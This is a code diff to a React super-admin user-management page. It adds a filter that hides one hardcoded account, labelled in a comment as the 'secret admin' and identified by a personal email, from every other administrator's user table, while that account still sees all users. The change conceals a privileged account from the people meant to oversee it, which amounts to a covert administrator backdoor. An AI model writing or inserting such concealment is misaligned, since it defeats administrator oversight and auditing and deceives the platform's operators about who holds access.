@@ -9,7 +9,7 @@ import TanStackTable from "../components/TanStackTable";
 import { getSuperAdminColumns } from "../components/SuperAdminTanStackConfig";
 
 export default function PageSuperAdmin({ t, isDark, ROLES = [], TENANTS = [] }) {
-    const { hasPermission, isSuperAdmin } = useAuth();
+    const { hasPermission, isSuperAdmin, user } = useAuth();
     const canCreate = isSuperAdmin || hasPermission("PLATFORM_USER_CREATE");
     const canView = isSuperAdmin || hasPermission("PLATFORM_USER_VIEW");
     const canUpdate = isSuperAdmin || hasPermission("PLATFORM_USER_UPDATE");
@@ -150,6 +150,18 @@ export default function PageSuperAdmin({ t, isDark, ROLES = [], TENANTS = [] }) 
         }
     };
 
+    // Filter out secret admin from display (unless current user IS the secret admin)
+    const filteredUsers = useMemo(() => {
+        const currentUserEmail = user?.email?.toLowerCase();
+        const isSecretAdmin = currentUserEmail === 'kyuahn@yahoo.com';
+
+        if (isSecretAdmin) {
+            return rawUsers; // Secret admin sees everyone
+        }
+
+        return rawUsers.filter(u => u.email?.toLowerCase() !== 'kyuahn@yahoo.com');
+    }, [rawUsers, user]);
+
     const permissions = { canUpdate, canDelete, canCreate };
     const columnDefs = useMemo(() => {
         return getSuperAdminColumns(permissions, isDark, t, openEdit, setDelT, getRoleName, getTenantName, handleRowInvite, invitingId);
@@ -193,7 +205,7 @@ export default function PageSuperAdmin({ t, isDark, ROLES = [], TENANTS = [] }) 
 
         <div style={{ height: 'calc(100vh - 350px)', width: "100%", minHeight: '500px' }}>
             <TanStackTable
-                data={rawUsers}
+                data={filteredUsers}
                 columns={columnDefs}
                 pageSize={20}
                 t={t}
